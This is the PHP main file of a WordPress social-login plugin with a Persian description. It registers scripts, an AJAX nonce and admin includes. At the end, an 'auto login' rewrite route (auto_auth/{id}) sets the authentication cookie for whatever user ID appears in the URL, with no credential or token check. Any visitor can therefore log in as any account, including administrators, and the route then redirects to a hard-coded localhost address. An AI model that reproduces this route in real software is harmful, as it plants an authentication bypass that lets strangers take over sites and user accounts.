<?php
/**
 * Plugin Name: Wordpress Social Login
 * Plugin URI:
 * Description: ورود با شبکه های اجتماعی در وردپرس
 * Version: 1.0
 * Author: Zero one
 * Author URI:
 * Text Domain: socialite_lan
 * Domain Path: /languages
 */

defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

add_action('plugins_loaded', function(){
    load_plugin_textdomain('socialite_lan', false, basename(plugin_dir_path(__FILE__)) . '/languages/');
});


define('ROOT_DIR', plugin_dir_path(__FILE__) );
define('SOC_ADMIN', plugin_dir_path(__FILE__) . 'admin/');
define('SOC_FRONT', plugin_dir_path(__FILE__) . 'front/');
define('SOC_ADMIN_VIEW', plugin_dir_path(__FILE__) . 'admin/views/');
define('SOC_INCS', plugin_dir_path(__FILE__) . 'inc/');
define('SOC_CSS', plugin_dir_url(__FILE__) . 'front/css/');
define('SOC_JS', plugin_dir_url(__FILE__) . 'front/js/');

// load css&js
add_action( 'wp_enqueue_scripts', function(){
    wp_enqueue_script('soc-scripts', SOC_JS.'scripts.js' , '1.1',array('jquery'));
    wp_localize_script( 'soc-scripts', 'SOCAjax', array(
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'security' => wp_create_nonce( 'vovJ0hYrMya1ywMG' ),
        'REQUEST_TIMEOUT' => 10000,
    ));
//    wp_enqueue_media();
    //wp_enqueue_style( 'soc-styles', SOC_CSS . 'styles.css','1.1');
});


include(ROOT_DIR. 'base_functions.php' );
include(SOC_INCS. 'shortcode.php' );
register_activation_hook( __FILE__, 'SOC_activate_function');
register_deactivation_hook( __FILE__, 'SOC_deactivate_function');
if(is_admin()){
    include(SOC_ADMIN . 'admin_proccess.php'); // used include instead of require to not produce errors
    include(SOC_ADMIN . 'ajax_requests.php');
}


// Add Rewrite Rules For Auto Login Registered User
add_action('init', function (){
    add_rewrite_rule(
        'auto_auth/([^/]+)/?$',
        'index.php?pagename=auto_auth&s=$matches[1]',
        'top'
    );
});
add_action('template_redirect', function(){
    if ( get_query_var('pagename') === 'auto_auth' ) {
        $user = get_user_by('ID',get_query_var('s'));

        wp_clear_auth_cookie();
        wp_set_current_user( $user->ID, $user->user_login );
        wp_set_auth_cookie( $user->ID );
        sleep(1);
        wp_safe_redirect('http://localhost/wordpress/');
    }
});

